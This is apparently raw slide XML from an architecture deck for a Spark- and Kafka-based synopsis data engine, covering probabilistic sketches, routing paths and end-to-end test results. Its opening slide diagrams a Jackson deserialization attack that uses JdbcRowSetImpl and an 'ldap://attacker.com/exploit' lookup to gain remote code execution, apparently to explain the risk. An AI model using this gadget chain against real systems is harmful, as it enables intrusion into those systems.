            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>json</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Datapoint.class</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>     Jackson sees the type array → looks up class by name</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>           │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>           ▼</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  4. JVM loads </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>com.sun.rowset.JdbcRowSetImpl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>classpath</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>           │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>           ▼</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  5. Jackson calls </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>setDataSourceName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ldap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>://attacker.com/exploit")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>           │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>           ▼</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  6. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>JdbcRowSetImpl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> makes an outbound LDAP/RMI request to attacker's server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>           │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>           ▼</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  7. Attacker's server returns a serialized Java object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>           │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>           ▼</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  8. JVM deserializes and executes attacker's code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>     → Full Remote Code Execution on the Spark executor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19E3-A8BB-4855-ABBB-FACD74A108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02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Validated GREEN Path — End-to-End Test (2026-03-25)</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>This slide shows the actual validated flow with real numbers from the EndToEndTestProducer.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>GREEN path means noOfP=1: single partition, no merging needed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>The CountMin sketch tracks frequency/sum of values per key.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>Query "AAPL" returns the sum of all prices added under StockID="AAPL".</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Key points:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>- DataRouter passes through requests and data unchanged when noOfP=1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>- SynopsisProcessor handles the full lifecycle: ADD -&gt; DATA -&gt; ESTIMATE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>- PathSplitter routes noOfP==1 directly to output (skips ReduceAggregator)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>- Result confirmed on Kafka estimation_topic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Validated PURPLE Path — End-to-End Test (2026-03-25)</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>This slide shows the actual validated flow with real numbers from the EndToEndTestProducer.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>PURPLE path means noOfP&gt;1: multiple partitions, requires merging via ReduceAggregator.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Key points:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>- DataRouter registers parallelism and fans out requests in a single stateful operator</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>- Data is hashed by streamID (not StockID) to determine the partition slot</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>- Different streamIDs hash to different slots, distributing data across partitions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>- Each partition maintains an independent CountMin sketch with its own subset of data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>- ESTIMATE is also fanned out — each partition produces a partial result</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>- ReduceAggregator waits for all noOfP partials, then reduces with SimpleSumFunction</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>- Final merged result is written to estimation_topic</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Data routing detail:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  slot = abs(streamID.hashCode()) % noOfP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  EURUSD.hashCode() % 2 = 0  -&gt; Forex_2_KEYED_0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  GBPUSD.hashCode() % 2 = 1  -&gt; Forex_2_KEYED_1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  USDJPY.hashCode() % 2 = 1  -&gt; Forex_2_KEYED_1</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Architectural insight: DataRouter must handle both request fan-out AND data fan-out</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>because both must share the same partition state. The ADD request registers parallelism</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>on key=Forex, and subsequent data arriving on key=Forex uses that registration to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07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120640"/>
            <a:ext cx="502920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5212080"/>
            <a:ext cx="3200400" cy="7315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 dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SDE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BDEFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Synopsis Data Engine — Spark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42" y="336499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0CAF9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Architecture Design  &amp;  Layer-by-Layer Technical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777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64B5F6"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Apache Spark 3.5+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Synopsis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CEFF4"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Four probabilistic data structures  |  Fixed memory regardless of stream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B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SDE_Spark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B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>2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2788920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2788920" cy="6583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" y="129844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12984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565C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261872"/>
            <a:ext cx="2011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CountMin
Sketch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38528"/>
            <a:ext cx="2514600" cy="45720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94767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565C0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Frequency
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8716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32E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"How many times did
item X appear?"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64992"/>
            <a:ext cx="2514600" cy="27432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381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  <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Merge function: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2463"/>
            <a:ext cx="2514600" cy="3474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7216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65C0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SimpleSumFunction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3552" y="1188720"/>
            <a:ext cx="2788920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73552" y="1188720"/>
            <a:ext cx="2788920" cy="65836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83280" y="129844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12984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71C1C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1261872"/>
            <a:ext cx="2011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BloomFilter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0712" y="1938528"/>
            <a:ext cx="2514600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10712" y="194767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B71C1C"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Set
Membership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248716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32E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"Has item X ever
appeared in the stream?"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0712" y="3364992"/>
            <a:ext cx="2514600" cy="27432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10712" y="34381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  <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Merge function: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10712" y="3712463"/>
            <a:ext cx="251460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10712" y="37216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71C1C"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SimpleORFunction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7064" y="1188720"/>
            <a:ext cx="2788920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27064" y="1188720"/>
            <a:ext cx="2788920" cy="65836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36792" y="129844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36792" y="12984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A8A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864" y="1261872"/>
            <a:ext cx="2011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AMS
Sketch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4224" y="1938528"/>
            <a:ext cx="2514600" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E0F4F6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64224" y="194767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7A8A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Second-Moment
Estimation  (F2)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248716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32E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"What is the frequency
variance of the stream?"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64224" y="3364992"/>
            <a:ext cx="2514600" cy="27432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64224" y="34381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  <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Merge function: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64224" y="3712463"/>
            <a:ext cx="2514600" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E0F4F6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64224" y="37216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8A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SimpleSumFunction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0576" y="1188720"/>
            <a:ext cx="2788920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80576" y="1188720"/>
            <a:ext cx="2788920" cy="6583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290303" y="129844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90303" y="129844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5100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6376" y="1261872"/>
            <a:ext cx="2011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HyperLogLog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17736" y="1938528"/>
            <a:ext cx="251460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17736" y="194767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65100"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Cardinality
Estimation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17736" y="248716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32E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"How many DISTINCT
items appeared?"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17736" y="3364992"/>
            <a:ext cx="2514600" cy="27432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17736" y="34381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  <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Merge function: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17736" y="3712463"/>
            <a:ext cx="25146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17736" y="37216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5100"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SimpleSumFunction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327648"/>
            <a:ext cx="11548872" cy="27432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EC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6-Layer Pipeline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5778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1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="90CAF9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1000" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="90CAF9"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Kafka input streams  →  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="90CAF9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6 </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1000" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="90CAF9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>processing layers  →  Kafka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806" y="987552"/>
            <a:ext cx="713232" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C8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6374" y="960120"/>
            <a:ext cx="713232" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1565C0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6374" y="960120"/>
            <a:ext cx="713232" cy="25603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6374" y="996696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KAFKA
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238" y="1344168"/>
            <a:ext cx="603504" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D47A1"/>
          </a:solidFill>
          <a:ln w="635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0382" y="1399032"/>
            <a:ext cx="5852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 err="1">
                <a:solidFill>
                  <a:srgbClr val="BBDEFB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>D</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="700" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="BBDEFB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ata_topic</a:t>
            </a:r>
            <a:endParaRPr sz="700" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="BBDEFB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1238" y="1892807"/>
            <a:ext cx="603504" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D47A1"/>
          </a:solidFill>
          <a:ln w="635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382" y="1947672"/>
            <a:ext cx="585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0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="BBDEFB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>R</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="BBDEFB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>equest</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="BBDEFB"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="BBDEFB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>_topic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374" y="3593591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90CAF9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>INPUT 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28750" y="2455164"/>
            <a:ext cx="141732" cy="27432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35608" y="234086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BD5E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7058" y="987552"/>
            <a:ext cx="1371600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C8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79626" y="960120"/>
            <a:ext cx="1371600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EBF7ED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79626" y="960120"/>
            <a:ext cx="1371600" cy="768096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B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79626" y="987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9626" y="1380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E0B2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ingestion
&amp; Parsing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79626" y="1728216"/>
            <a:ext cx="1371600" cy="228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71066" y="1911096"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B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80794" y="185623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</a:rPr>
              <a:t>readStream.format(kafka)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1066" y="2551176"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B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80794" y="249631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map(parse JSON)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71066" y="3191256"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B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80794" y="313639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Datapoint / Request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60370" y="2455164"/>
            <a:ext cx="141732" cy="27432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67228" y="234086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0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8678" y="987552"/>
            <a:ext cx="1371600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C8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111246" y="960120"/>
            <a:ext cx="1371600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF3E8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11246" y="960120"/>
            <a:ext cx="1371600" cy="768096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C04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11246" y="987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11246" y="1380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E0B2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Routing &amp;
Registration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11246" y="1728216"/>
            <a:ext cx="1371600" cy="228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2686" y="1911096"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C04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12414" y="185623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</a:rPr>
              <a:t>DataRouter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2686" y="2551176"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C04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12414" y="249631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RequestRouter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2686" y="3191256"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C04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12414" y="313639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flatMapGroupsWithState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91990" y="2455164"/>
            <a:ext cx="141732" cy="27432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98848" y="234086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0"/>
                </a:solidFill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70298" y="987552"/>
            <a:ext cx="1371600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C8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642866" y="960120"/>
            <a:ext cx="1371600" cy="3017520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642866" y="960120"/>
            <a:ext cx="1371600" cy="768096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B8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42866" y="987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42866" y="1380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E0B2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Synopsis
Processing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42866" y="1728216"/>
            <a:ext cx="1371600" cy="228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734306" y="1911096"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B8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44034" y="185623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</a:rPr>
              <a:t>SynopsisProcessor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34306" y="2551176"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B8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44034" y="249631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flatMapGroupsWithState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34306" y="3191256"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B8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44034" y="313639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RocksDB state  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23610" y="2455164"/>
            <a:ext cx="141732" cy="27432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30468" y="234086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0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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01918" y="987552"/>
            <a:ext cx="1371600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C8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74486" y="960120"/>
            <a:ext cx="1371600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F5EEFF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174486" y="960120"/>
            <a:ext cx="1371600" cy="768096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5E1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74486" y="987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4486" y="1380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E0B2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Path
Splitting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4486" y="1728216"/>
            <a:ext cx="1371600" cy="228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65926" y="1911096"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5E1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75654" y="185623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</a:rPr>
              <a:t>PathSplitter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5926" y="2551176"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5E1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75654" y="249631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filter(noOfP)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5926" y="3191256"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5E1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75654" y="313639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GREEN vs PURPLE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55230" y="2455164"/>
            <a:ext cx="141732" cy="27432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62088" y="234086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0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▶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33538" y="987552"/>
            <a:ext cx="1371600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C8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706106" y="960120"/>
            <a:ext cx="1371600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E4F0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706106" y="960120"/>
            <a:ext cx="1371600" cy="768096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D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706106" y="987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06106" y="1380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E0B2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Aggregation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06106" y="1728216"/>
            <a:ext cx="1371600" cy="22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797546" y="1911096"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D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907274" y="185623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</a:rPr>
              <a:t>ReduceAggregator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97546" y="2551176"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D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907274" y="249631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flatMapGroupsWithState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97546" y="3191256"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D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7274" y="313639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Merge N partials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86850" y="2455164"/>
            <a:ext cx="141732" cy="27432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093708" y="234086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0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▶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65158" y="987552"/>
            <a:ext cx="1371600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C8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237726" y="960120"/>
            <a:ext cx="1371600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EBF0FF"/>
          </a:solidFill>
          <a:ln w="127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237726" y="960120"/>
            <a:ext cx="1371600" cy="768096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162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237726" y="987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37726" y="1380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E0B2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Output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37726" y="1728216"/>
            <a:ext cx="1371600" cy="228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329166" y="1911096"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162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438894" y="185623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2E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>KafkaOutputLayer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29166" y="2551176"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162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438894" y="249631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writeStream.format(kafka)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329166" y="3191256"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162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438894" y="3136392"/>
            <a:ext cx="1115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ProcessingTime trigger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618470" y="2455164"/>
            <a:ext cx="141732" cy="27432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625328" y="234086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0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▶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796778" y="987552"/>
            <a:ext cx="713232" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C8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0769346" y="960120"/>
            <a:ext cx="713232" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1565C0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0769346" y="960120"/>
            <a:ext cx="713232" cy="25603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769346" y="996696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KAFKA
OUTPUT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824210" y="1344168"/>
            <a:ext cx="603504" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D47A1"/>
          </a:solidFill>
          <a:ln w="635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833354" y="1399032"/>
            <a:ext cx="585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 err="1">
                <a:solidFill>
                  <a:srgbClr val="BBDEFB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>E</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="700" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="BBDEFB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>stimation_topic</a:t>
            </a:r>
            <a:endParaRPr sz="700" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="BBDEFB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0769346" y="3593591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90CAF9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&lt; OUTPUT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111246" y="4160520"/>
            <a:ext cx="2903220" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF8E1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111246" y="4160520"/>
            <a:ext cx="109728" cy="47548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275838" y="4165092"/>
            <a:ext cx="270205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 err="1">
                <a:solidFill>
                  <a:srgbClr val="BF360C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RocksDB</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="900" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="BF360C"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (local SSD)  +  HDFS/S3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="BF360C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/ADLS</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="900" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="BF360C"/>
                </a:solidFill>
              </a:rPr>
              <a:t> checkpoint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57551" y="4345686"/>
            <a:ext cx="27020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8B3A00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>★  Core state backend — synopses survive restarts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74486" y="4160520"/>
            <a:ext cx="2171700" cy="475488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6174486" y="4160520"/>
            <a:ext cx="109728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339078" y="4156709"/>
            <a:ext cx="19705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B5E20"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GREEN PATH   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="900" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1B5E20"/>
                </a:solidFill>
              </a:rPr>
              <a:t>noOfP</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="900" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B5E20"/>
                </a:solidFill>
              </a:rPr>
              <a:t> =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51270" y="4325620"/>
            <a:ext cx="19705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2E7D32"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Direct output  →  skip aggregation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437626" y="4160520"/>
            <a:ext cx="2171700" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
